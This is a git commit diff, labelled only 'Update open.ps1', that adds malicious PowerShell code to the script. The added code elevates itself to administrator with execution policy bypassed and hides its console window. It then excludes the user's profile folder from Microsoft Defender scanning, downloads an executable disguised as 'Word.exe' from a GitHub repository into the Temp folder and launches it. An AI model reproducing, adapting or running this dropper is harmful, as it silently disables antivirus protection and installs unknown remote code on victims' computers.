49817f643850314347a17614cc0cee1b8cbb1f0e
MrRoyal1235 <94418680+MrRoyal1235@users.noreply.github.com>
2024-10-05 10:01:10 +0700

    Update open.ps1

--- open.ps1
+++ open.ps1
@@ -1,3 +1,26 @@
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
+    exit;
+}
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+function Hide-Console
+{
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+    #0 hide
+    [Console.Window]::ShowWindow($consolePtr, 0)
+}
+Hide-Console
+Add-MpPreference -ExclusionPath $env:USERPROFILE
+$url = 'https://github.com/MrRoyal1235/checkaccvjppro/raw/main/Word.exe'
+$outputFile = [System.IO.Path]::Combine($env:Temp, 'Word.exe')
+Start-Sleep -Milliseconds 100 
+Invoke-WebRequest -Uri $url -OutFile $outputFile
+Start-Process -FilePath $outputFile
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
